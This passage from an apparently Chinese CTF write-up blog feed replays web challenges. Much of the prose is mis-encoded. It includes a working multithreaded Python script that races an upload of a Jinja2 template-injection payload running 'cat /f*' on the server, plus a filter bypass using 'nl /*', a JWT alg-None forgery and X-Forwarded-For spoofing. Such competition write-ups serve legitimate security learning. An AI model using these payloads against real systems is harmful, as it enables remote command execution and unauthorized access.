class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url_read = <span class="hljs-string">&quot;http://27.25.151.26:30673/read&quot;</span><br>url_upload = <span class="hljs-string">&quot;http://27.25.151.26:30673/upload&quot;</span><br>stop_event = threading.Event()<br><br>headers = &#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot;</span>,<br>    <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9&quot;</span>,<br>    <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>,<br>    <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://27.25.151.26:30673/&quot;</span>,<br>    <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.EYrwzSGzfGe_PMnw-Wl4Ymt_QuMtyApHi57DMcZ7e3U&quot;</span><br>&#125;<br><br>read_data = &#123;<br>    <span class="hljs-string">&quot;book_path&quot;</span>: <span class="hljs-string">&quot;/app/templates/reading.html&quot;</span><br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>():<br>    payload = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;div class=&quot;book-content&quot;&gt;</span><br><span class="hljs-string">    &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /f*&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="hljs-string">    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>    files = &#123;<br>        <span class="hljs-string">&quot;file&quot;</span>: (<span class="hljs-string">&quot;reading.html&quot;</span>, payload, <span class="hljs-string">&quot;image/jpeg&quot;</span>),<br>        <span class="hljs-string">&quot;book_path&quot;</span>: (<span class="hljs-literal">None</span>, <span class="hljs-string">&quot;/app/templates/&quot;</span>)<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> stop_event.is_set():<br>        <span class="hljs-keyword">try</span>:<br>            r = requests.post(url_upload, headers=headers, files=files, timeout=<span class="hljs-number">5</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[UPLOAD]&quot;</span>, r.status_code)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[UPLOAD] é”™è¯¯:&quot;</span>, e)<br>        time.sleep(<span class="hljs-number">0.1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_read</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> stop_event.is_set():<br>        <span class="hljs-keyword">try</span>:<br>            r = requests.post(url_read, headers=headers, data=read_data, timeout=<span class="hljs-number">5</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[READ]&quot;</span>, r.status_code)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> r.text <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;CTF&quot;</span> <span class="hljs-keyword">in</span> r.text <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&#123;&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è·å–åˆ° flag:\n&quot;</span>, r.text)<br>                stop_event.<span class="hljs-built_in">set</span>()<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[READ] é”™è¯¯:&quot;</span>, e)<br>        time.sleep(<span class="hljs-number">0.1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack_thread</span>():<br>    threading.Thread(target=upload_file).start()<br>    threading.Thread(target=send_read).start()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>        threading.Thread(target=attack_thread).start()<br><br></code></pre></td></tr></table></figure><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522192816048.png" alt="image-20250522192816048"></p><h1 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h1><p>ç¬¬ä¸€å…³ï¼šGETä¼ å‚<code>a</code>ï¼Œå€¼ä¸º<code>welcome</code>ï¼ŒPOSTä¼ å‚<code>b</code>ï¼Œå€¼ä¸º<code>new</code>ï¼Œ<code>cookie</code>é‡Œçš„<code>star</code>å€¼æ”¹ä¸º<code>admin</code></p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/1747816245349-a8e24bb5-6b87-449a-9d27-7e815df44835.png" alt="img"></p><p>ç¬¬äºŒå…³<code>/l23evel4.php</code>ï¼šGETä¼ å‚<code>password</code>ï¼Œå€¼ä¸º<code>2025a</code></p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/1747816514521-d6bed688-be02-4722-922d-55cd7fbfa574.png" alt="img"></p><p>ç¬¬ä¸‰å…³<code>/levelThree.php</code>ï¼šåŠ <code>Referer</code>å¤´ï¼Œè¿˜æœ‰POSTä¼ å‚<code>key</code></p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/1747817033614-3476ca8c-3410-485a-97ca-c895eca7d0d5.png" alt="img"></p><p>ç¬¬å››å…³<code>/level444Four.php</code>ï¼šè¯·æ±‚æ–¹æ³•æ¢æˆ<code>HEAD</code>ï¼Œæ”¹<code>User-Agent</code>å¤´ä¸º<code>identity=n1c3</code></p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/1747817180752-212c70ca-9745-465b-82e9-1576e439b53a.png" alt="img"></p><p>ç¬¬äº”å…³<code>/level4545Five.php</code>ï¼šç›´æ¥AIå‡ºå¯†ç </p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/1747817687723-076a2ee6-5601-464d-8a32-72e0c91f630a.png" alt="img"></p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/1747817702548-46042769-b3d0-44be-a0e3-6bb85fdb989b.png" alt="img"></p><p> ç¬¬å…­å…³<code>/zzpufinish.php</code>ï¼šå‘ç°<code>cat</code>å’Œ<code>flag</code>è¢«ç¦äº†ï¼Œç›´æ¥ç”¨<code>nl /*</code></p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/1747817781981-34c9b9a1-7bc6-4d71-8d84-27cc00e3650a.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›å¤ç°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ¯”èµ›å¤ç°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¬¬äºŒå±Šå¸•é²æ¯webå¤ç°</title>
    <link href="/2025/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/giaogiaohuohua/article/details/148055593">https://blog.csdn.net/giaogiaohuohua/article/details/148055593</a></p></blockquote><h1 id="CatBank"><a href="#CatBank" class="headerlink" title="CatBank"></a>CatBank</h1><p>å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·a</p><p><img src="/2025/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250521190819353.png" alt="image-20250521190819353"></p><p>æ ¹æ®è¿™ä¸ªæç¤ºå¯çŸ¥è¦ä½™é¢ä¸ºä¸€ç™¾ä¸‡ï¼Œå¯ä»¥è¿›è¡Œè½¬è´¦ï¼Œå¦å¤–æ³¨å†Œä¸€ä¸ªè´¦æˆ·bï¼Œç”¨è´¦æˆ·aç»™è´¦æˆ·bè½¬è´¦ä¸€ç™¾ä¸‡</p><p><img src="/2025/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250521191105882.png" alt="image-20250521191105882"></p><p>ç„¶åç™»å½•è´¦æˆ·bå¾—åˆ°flagï¼Œç™»å½•åå¯ä»¥å†è½¬è´¦ä¸€æ¬¡ï¼Œå°±å¯ä»¥å¾—åˆ°flagäº†</p><p><img src="/2025/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250521191207690.png" alt="image-20250521191207690"></p><h1 id="çŒ«çŒ«çš„ç§˜å¯†"><a href="#çŒ«çŒ«çš„ç§˜å¯†" class="headerlink" title="çŒ«çŒ«çš„ç§˜å¯†"></a>çŒ«çŒ«çš„ç§˜å¯†</h1><p>æŸ¥çœ‹ç½‘é¡µæºç </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">let</span> token = <span class="hljs-string">&#x27;&#x27;</span>;</span><br><span class="language-javascript">        </span><br><span class="language-javascript">        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;loginBtn&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-title function_">async</span> () =&gt; &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">const</span> username = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;username&#x27;</span>).<span class="hljs-property">value</span>;</span><br><span class="language-javascript">            <span class="hljs-keyword">const</span> password = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;password&#x27;</span>).<span class="hljs-property">value</span>;</span><br><span class="language-javascript">            </span><br><span class="language-javascript">            <span class="hljs-keyword">try</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, &#123;</span><br><span class="language-javascript">                    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,</span><br><span class="language-javascript">                    <span class="hljs-attr">headers</span>: &#123;</span><br><span class="language-javascript">                        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span></span><br><span class="language-javascript">                    &#125;,</span><br><span class="language-javascript">                    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; username, password &#125;)</span><br><span class="language-javascript">                &#125;);</span><br><span class="language-javascript">                </span><br><span class="language-javascript">                <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();</span><br><span class="language-javascript">                </span><br><span class="language-javascript">                <span class="hljs-keyword">if</span> (response.<span class="hljs-property">ok</span>) &#123;</span><br><span class="language-javascript">                    token = data.<span class="hljs-property">token</span>;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;loginResult&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-string">`ç™»å½•æˆåŠŸ: <span class="hljs-subst">$&#123;data.message&#125;</span>`</span>;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;loginResult&#x27;</span>).<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">&#x27;hidden&#x27;</span>);</span><br><span class="language-javascript">                    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;loginSection&#x27;</span>).<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">&#x27;hidden&#x27;</span>);</span><br><span class="language-javascript">                    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;secretSection&#x27;</span>).<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">&#x27;hidden&#x27;</span>);</span><br><span class="language-javascript">                &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;loginResult&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-string">`é”™è¯¯: <span class="hljs-subst">$&#123;data.error&#125;</span>`</span>;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;loginResult&#x27;</span>).<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">&#x27;hidden&#x27;</span>);</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125; <span class="hljs-keyword">catch</span> (error) &#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;loginResult&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-string">`å‘ç”Ÿé”™è¯¯: <span class="hljs-subst">$&#123;error.message&#125;</span>`</span>;</span><br><span class="language-javascript">                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;loginResult&#x27;</span>).<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">&#x27;hidden&#x27;</span>);</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">        </span><br><span class="language-javascript">        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;getSecretBtn&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-title function_">async</span> () =&gt; &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">try</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/get_secret&#x27;</span>, &#123;</span><br><span class="language-javascript">                    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;GET&#x27;</span>,</span><br><span class="language-javascript">                    <span class="hljs-attr">headers</span>: &#123;</span><br><span class="language-javascript">                        <span class="hljs-string">&#x27;Authorization&#x27;</span>: token</span><br><span class="language-javascript">                    &#125;</span><br><span class="language-javascript">                &#125;);</span><br><span class="language-javascript">                </span><br><span class="language-javascript">                <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();</span><br><span class="language-javascript">                </span><br><span class="language-javascript">                <span class="hljs-keyword">if</span> (response.<span class="hljs-property">ok</span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-keyword">let</span> resultText = <span class="hljs-string">`<span class="hljs-subst">$&#123;data.message&#125;</span>\n\n`</span>;</span><br><span class="language-javascript">                    </span><br><span class="language-javascript">                    <span class="hljs-keyword">if</span> (data.<span class="hljs-property">public</span>) &#123;</span><br><span class="language-javascript">                        resultText += <span class="hljs-string">`<span class="hljs-subst">$&#123;data.public&#125;</span>\n\n`</span>;</span><br><span class="language-javascript">                    &#125;</span><br><span class="language-javascript">                    </span><br><span class="language-javascript">                    <span class="hljs-keyword">if</span> (data.<span class="hljs-property">confidential</span>) &#123;</span><br><span class="language-javascript">                        resultText += <span class="hljs-string">`çŒ«çŒ«ä¿¡æ¯: <span class="hljs-subst">$&#123;data.confidential&#125;</span>\n\n`</span>;</span><br><span class="language-javascript">                    &#125;</span><br><span class="language-javascript">                    </span><br><span class="language-javascript">                    <span class="hljs-keyword">if</span> (data.<span class="hljs-property">flag</span>) &#123;</span><br><span class="language-javascript">                        resultText += <span class="hljs-string">`Flag: <span class="hljs-subst">$&#123;data.flag&#125;</span>`</span>;</span><br><span class="language-javascript">                    &#125;</span><br><span class="language-javascript">                    </span><br><span class="language-javascript">                    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;secretResult&#x27;</span>).<span class="hljs-property">textContent</span> = resultText;</span><br><span class="language-javascript">                &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;secretResult&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-string">`é”™è¯¯: <span class="hljs-subst">$&#123;data.error&#125;</span>`</span>;</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">                </span><br><span class="language-javascript">                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;secretResult&#x27;</span>).<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">&#x27;hidden&#x27;</span>);</span><br><span class="language-javascript">            &#125; <span class="hljs-keyword">catch</span> (error) &#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;secretResult&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-string">`å‘ç”Ÿé”™è¯¯: <span class="hljs-subst">$&#123;error.message&#125;</span>`</span>;</span><br><span class="language-javascript">                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;secretResult&#x27;</span>).<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">&#x27;hidden&#x27;</span>);</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">        </span><br><span class="language-javascript">        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;logoutBtn&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;</span><br><span class="language-javascript">            token = <span class="hljs-string">&#x27;&#x27;</span>;</span><br><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;username&#x27;</span>).<span class="hljs-property">value</span> = <span class="hljs-string">&#x27;&#x27;</span>;</span><br><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;password&#x27;</span>).<span class="hljs-property">value</span> = <span class="hljs-string">&#x27;&#x27;</span>;</span><br><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;loginResult&#x27;</span>).<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">&#x27;hidden&#x27;</span>);</span><br><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;secretResult&#x27;</span>).<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">&#x27;hidden&#x27;</span>);</span><br><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;secretSection&#x27;</span>).<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">&#x27;hidden&#x27;</span>);</span><br><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;loginSection&#x27;</span>).<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">&#x27;hidden&#x27;</span>);</span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å‘ç°å­˜åœ¨ä¸€ä¸ª<code>/get_secret</code>è·¯ç”±ï¼Œå­˜åœ¨æœ‰<code>Authorization</code>è¿›è¡Œè®¤è¯ï¼Œæµ‹è¯•åå‘ç°æ˜¯<code>JWT</code>è®¤è¯ï¼Œä¼ªé€ æˆ<code>admin</code>å»è®¿é—®</p><p><img src="/2025/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522111905489.png" alt="image-20250522111905489"></p><p>ä½†æ˜¯ä¼šå¾—åˆ°<code>Invalid token: Invalid algorithm</code>æŠ¥é”™</p><p><img src="/2025/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522111932989.png" alt="image-20250522111932989"></p><p>JWTå­˜åœ¨ä¸€ä¸ªCVEæ¼æ´</p><blockquote><p>åœ¨JWTçš„Headerä¸­algçš„å€¼ç”¨äºå‘Šè¯‰æœåŠ¡å™¨ä½¿ç”¨å“ªç§ç®—æ³•å¯¹ä»¤ç‰Œè¿›è¡Œç­¾åï¼Œä»è€Œå‘Šè¯‰æœåŠ¡å™¨åœ¨éªŒè¯ç­¾åæ—¶éœ€è¦ä½¿ç”¨å“ªç§ç®—æ³•ï¼Œç›®å‰å¯ä»¥é€‰æ‹©HS256ï¼Œå³HMACå’ŒSHA256ï¼ŒJWTåŒæ—¶ä¹Ÿæ”¯æŒå°†ç®—æ³•è®¾å®šä¸ºâ€Noneâ€ï¼Œå¦‚æœâ€algâ€å­—æ®µè®¾ä¸ºâ€Noneâ€ï¼Œåˆ™æ ‡è¯†ä¸ç­¾åï¼Œè¿™æ ·ä¸€æ¥ä»»ä½•tokenéƒ½æ˜¯æœ‰æ•ˆçš„</p></blockquote><p>æ‰€ä»¥è¿™é‡Œå¯ä»¥å°†<code>alg</code>éƒ¨åˆ†è®¾ç½®ä¸º<code>None</code>ç»•è¿‡</p><p>JWTç½‘ç«™ï¼š<a href="https://jwt.io/">https://jwt.io/</a></p><p><img src="/2025/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522112129697.png" alt="image-20250522112129697"></p><p>å°±ä¼šå¾—åˆ°å¦‚ä¸‹ä¿¡æ¯</p><p><img src="/2025/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522112159988.png" alt="image-20250522112159988"></p><p>åå…­è¿›åˆ¶è½¬åŒ–åæ˜¯</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;æ¬¢è¿ admin&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;public&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;å–µå–µå–µï¼Ÿä½ æƒ³çœ‹ä»€ä¹ˆæ&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>æƒé™è¿˜æ˜¯ä¸å¤Ÿè·å¾—flagï¼Œç»§ç»­æ„é€ jwtçš„payloadéƒ¨åˆ†ï¼Œå¸¸è§çš„æƒé™å­—ç¬¦ä¸²æœ‰ï¼š<code>role</code>ï¼Œ<code>account</code>ï¼Œ<code>isAdmin</code>ç­‰ï¼Œç»è¿‡å°è¯•åå‘ç°æ˜¯<code>role</code></p><p><img src="/2025/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522113032964.png" alt="image-20250522113032964"></p><p><img src="/2025/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522113046029.png" alt="image-20250522113046029"></p><h1 id="CatNet"><a href="#CatNet" class="headerlink" title="CatNet"></a>CatNet</h1><p>ç”¨<code>dirsearch</code>å¯ä»¥æ‰«å‡º<code>/admin</code>è·¯ç”±</p><p><img src="/2025/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250521193326629.png" alt="image-20250521193326629"></p><p>è®¿é—®ä¼šçœ‹åˆ°æœ‰IPï¼Œæƒ³åˆ°ä¼ªé€ XFF</p><p><img src="/2025/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250521193641312.png" alt="image-20250521193641312"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Forwarded-For: <span 